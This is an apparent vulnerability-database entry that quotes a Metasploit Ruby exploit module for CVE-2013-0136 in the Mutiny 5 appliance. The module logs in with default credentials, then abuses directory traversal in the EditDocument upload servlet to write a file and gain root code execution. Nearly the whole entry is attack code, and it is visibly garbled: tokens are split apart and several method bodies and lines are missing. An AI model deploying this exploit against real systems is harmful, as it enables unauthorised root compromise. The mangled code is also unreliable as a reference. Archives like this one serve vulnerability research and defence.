{
    "text": "vul_name : Mutiny 5 Arbitrary File Upload ， vul_cve : CVE-2013-0136 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， HttpFingerprint = { : pattern => [ /Apache-Coyote/ ] } ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Mutiny 5 Arbitrary File Upload' ,  ， 'Description' => %q{ ， This module exploits a code execution flaw in the Mutiny 5 appliance. The ， EditDocument servlet provides a file upload function to authenticated users. A ， directory traversal vulnerability in the same functionality allows for arbitrary ， file upload , which results in arbitrary code execution with root privileges. In ， order to exploit the vulnerability a valid user ( any role ) in the web frontend is ， required. The module has been tested successfully on the Mutiny 5.0-1.07 appliance. ， } ,  ， 'Author' => ，  [  ， 'juan vazquez' # Metasploit module and initial discovery ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2013-0136' ]  ,  ，  [ 'US-CERT-VU' , '701572' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Privileged' => true ,  ， 'Platform' => 'linux' ,  ， 'Arch' => ARCH_X86 ,  ， 'Targets' => ，  [  ，  [ 'Mutiny 5.0-1.07 Appliance ( Linux ) ' , { } ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'May 15 2013' )  ， register_options (  ，  [  ， Opt : RPORT ( 80 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'Path to Mutiny Web Service' , '/' ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ true , 'The user to authenticate as' , 'superadmin @ mutiny.com' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'The password to authenticate with' , 'password' ]  )  ，  ]  , self.class )  ， end ， post_data = Rex : MIME : Message.new ， post_data.add_part ( contents , \"application/octet-stream\" , nil , \"form-data ; name=\\\"uploadFile\\\" ; filename=\\\" # {filename}\\\" )  ， post_data.add_part ( \"./././. # {location}\" , nil , nil , \"form-data ; name=\\\"uploadPath\\\" )  ，  # Work around an incompatible MIME implementation ， data = post_data.to_s ， data.gsub !  ( /\\r\\n\\r\\n-_Part/ , \"\\r\\n-_Part\" )  ， res = send_request_cgi (  ， { ， 'uri' => normalize_uri ( target_uri.path , \"interface\" , \"EditDocument\" )  ,  ， 'method' => 'POST' ,  ， 'data' => data ,  ， 'ctype' => \"multipart/form-data ; boundary= # {post_data.bound}\" ,  ， 'cookie' => \"JSESSIONID= # { @ session}\" ， } )  ， end ， end ， def login ， res = send_request_cgi (  ， { ， 'uri' => normalize_uri ( target_uri.path , \"interface\" , \"index.do\" )  ,  ， 'method' => 'GET' ， } )  ， first_session = $ 1 ， end ， res = send_request_cgi (  ， { ， 'uri' => normalize_uri ( target_uri.path , \"interface\" , \"j_security_check\" )  ,  ， 'method' => 'POST' ,  ， 'cookie' => \"JSESSIONID= # {first_session}\" ,  ， 'vars_post' => { ， 'j_username' => datastore [ 'USERNAME' ]  ,  ， 'j_password' => datastore [ 'PASSWORD' ]  ， } ， } )  ， end ， res = send_request_cgi (  ， { ， 'uri' => normalize_uri ( target_uri.path , \"interface\" , \"index.do\" )  ,  ， 'method' => 'GET' ,  ， 'cookie' => \"JSESSIONID= # {first_session}\" ， } )  ，  @ session = $ 1 ， end ， end ， def check ， res = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path , \"interface\" , \"/\" )  ,  ， } )  ， version = $ 1 ， end",
    "time": "2013.05.17"
}